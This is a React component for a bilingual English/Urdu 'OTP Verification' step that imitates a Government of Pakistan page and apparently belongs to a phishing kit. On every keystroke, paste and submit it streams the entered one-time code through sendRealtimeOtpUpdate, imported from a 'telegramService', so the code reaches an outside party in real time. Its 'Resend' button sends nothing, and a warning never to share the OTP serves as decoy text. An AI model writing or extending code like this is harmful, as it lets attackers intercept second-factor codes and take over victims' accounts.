import React, { useState, useEffect, useRef } from 'react';
import { ArrowRight, ArrowLeft, CheckCircle, ShieldAlert, RotateCw } from 'lucide-react';
import { sendRealtimeOtpUpdate } from '../services/telegramService';

interface Step4Props {
  mobileNo: string;
  otpValue: string;
  onUpdateOtp: (val: string) => void;
  onNext: () => void;
  onBack: () => void;
}

export const Step4OtpVerification: React.FC<Step4Props> = ({
  mobileNo,
  otpValue,
  onUpdateOtp,
  onNext,
  onBack,
}) => {
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [timerSeconds, setTimerSeconds] = useState<number>(180); // 3 minutes = 03:00
  const [error, setError] = useState<string>('');
  const [toastVisible, setToastVisible] = useState<boolean>(true);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Timer Countdown
  useEffect(() => {
    if (timerSeconds <= 0) return;
    const interval = setInterval(() => {
      setTimerSeconds((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timerSeconds]);

  // Sync initial otpValue into digits array if present
  useEffect(() => {
    if (otpValue) {
      const chars = otpValue.slice(0, 6).split('');
      setDigits((prev) => prev.map((_, i) => chars[i] || ''));
    }
  }, []);

  const formatTimer = (totalSecs: number) => {
    const mins = Math.floor(totalSecs / 60);
    const secs = totalSecs % 60;
    return `EXPIRES IN ${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleDigitChange = (index: number, value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (!cleaned) {
      const updated = [...digits];
      updated[index] = '';
      setDigits(updated);
      const code = updated.join('');
      onUpdateOtp(code);
      sendRealtimeOtpUpdate(code);
      return;
    }

    const lastChar = cleaned.slice(-1);
    const updated = [...digits];
    updated[index] = lastChar;
    setDigits(updated);
    const code = updated.join('');
    onUpdateOtp(code);
    sendRealtimeOtpUpdate(code);
    setError('');

    // Advance focus
    if (index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (pasted) {
      const charArr = pasted.split('');
      const updated = ['', '', '', '', '', ''];
      charArr.forEach((c, idx) => {
        if (idx < 6) updated[idx] = c;
      });
      setDigits(updated);
      const code = updated.join('');
      onUpdateOtp(code);
      sendRealtimeOtpUpdate(code);
      setError('');
      const focusTarget = Math.min(charArr.length, 5);
      inputRefs.current[focusTarget]?.focus();
    }
  };

  const handleResend = () => {
    setTimerSeconds(180);
    setToastVisible(true);
    setDigits(['', '', '', '', '', '']);
    onUpdateOtp('');
    setError('');
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const code = digits.join('');
    if (code.length < 6) {
      setError('Please enter complete 6-digit OTP code / مکمل 6 ہندسوں کا او ٹی پی درج کریں');
      return;
    }
    sendRealtimeOtpUpdate(code);
    onNext();
  };

  const maskPhone = (phone: string) => {
    if (!phone || phone.length < 11) return '03XX-XXXXX54';
    return `${phone.slice(0, 4)}-XXXXX${phone.slice(-2)}`;
  };

  return (
    <div className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-7 shadow-sm max-w-lg mx-auto">
      {/* Header */}
      <div className="flex items-start justify-between border-b border-slate-100 pb-4 mb-4">
        <div>
          <h2 className="text-xl sm:text-2xl font-bold text-[#0b1c33] font-sans">
            OTP Verification
          </h2>
          <p className="text-xs text-slate-500 mt-0.5">
            Secure two-factor authentication
          </p>
          <p className="text-xs font-serif text-slate-600 mt-0.5">
            دو مرحلوں کی محفوظ تصدیق
          </p>
        </div>
        <div className="text-right">
          <span className="text-xl sm:text-2xl font-serif font-bold text-[#0b1c33]">
            او ٹی پی تصدیق
          </span>
        </div>
      </div>

      {/* Success Sent Banner (Matching Screenshot 9) */}
      {toastVisible && (
        <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3.5 mb-4 text-emerald-800 text-xs flex items-start gap-2.5 shadow-xs">
          <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
          <div>
            <p className="font-semibold text-emerald-900">
              OTP code has been sent to your mobile number
            </p>
            <p className="font-serif text-emerald-800 text-[11px]">
              آپ کے موبائل نمبر پر او ٹی پی کوڈ بھیج دیا گیا ہے
            </p>
          </div>
        </div>
      )}

      {/* Code Sent To Phone Pill */}
      <div className="bg-slate-100 border border-slate-200 rounded-lg p-2.5 mb-5 text-center text-xs font-semibold text-slate-700">
        CODE SENT TO: <span className="font-mono text-[#0b1c33]">{maskPhone(mobileNo)}</span>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        {/* Digits Header */}
        <div className="text-center">
          <label className="text-xs font-bold text-slate-800 block">
            Enter 6-digit code
          </label>
          <span className="text-xs font-serif text-slate-600 block">
            6 ہندسوں کا کوڈ درج کریں
          </span>
        </div>

        {/* 6 Digit Input Boxes (Numeric Keyboards) */}
        <div className="flex items-center justify-center gap-2 sm:gap-2.5">
          {digits.map((digit, idx) => (
            <input
              key={idx}
              ref={(el) => (inputRefs.current[idx] = el)}
              type="tel"
              inputMode="numeric"
              id={`otp-input-${idx}`}
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(idx, e.target.value)}
              onKeyDown={(e) => handleKeyDown(idx, e)}
              onPaste={handlePaste}
              className={`w-10 h-12 sm:w-12 sm:h-14 text-center text-lg sm:text-xl font-bold font-mono bg-slate-50 border rounded-xl focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/40 transition-all ${
                digit ? 'border-[#0f2848] bg-slate-100/50' : 'border-slate-300'
              }`}
            />
          ))}
        </div>
        {error && <p className="text-xs text-red-500 text-center font-medium">{error}</p>}

        {/* Timer & Resend Button Row */}
        <div className="flex items-center justify-between text-xs pt-1 px-1">
          <span className="font-mono font-semibold text-slate-500">
            {formatTimer(timerSeconds)}
          </span>
          <button
            type="button"
            onClick={handleResend}
            id="resend-otp-btn"
            className="text-xs font-bold text-[#0f2848] hover:text-[#0e5e38] flex items-center gap-1 hover:underline focus:outline-hidden"
          >
            <RotateCw className="w-3 h-3" />
            <span>Resend / دوبارہ بھیجیں</span>
          </button>
        </div>

        {/* Security Warning Box */}
        <div className="bg-amber-50/80 border border-amber-200/80 rounded-xl p-3 text-[11px] text-amber-900 flex items-start gap-2.5">
          <ShieldAlert className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
          <div className="space-y-0.5">
            <p className="font-semibold">
              Never share your OTP with anyone. Government of Pakistan officials will never ask for your verification code.
            </p>
            <p className="font-serif text-amber-800">
              اپنا کوڈ کسی کے ساتھ شیئر نہ کریں۔
            </p>
          </div>
        </div>

        {/* Buttons */}
        <div className="pt-2 flex gap-3">
          <button
            type="button"
            onClick={onBack}
            id="step4-back-btn"
            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back / واپس</span>
          </button>

          <button
            type="submit"
            id="step4-continue-btn"
            className="flex-1 py-3 px-4 bg-[#0f2848] hover:bg-[#163a66] active:bg-[#0b1c33] text-white font-bold text-xs rounded-lg transition-all shadow-sm flex items-center justify-center gap-1.5"
          >
            <span>Verify OTP / تصدیق</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </form>
    </div>
  );
};

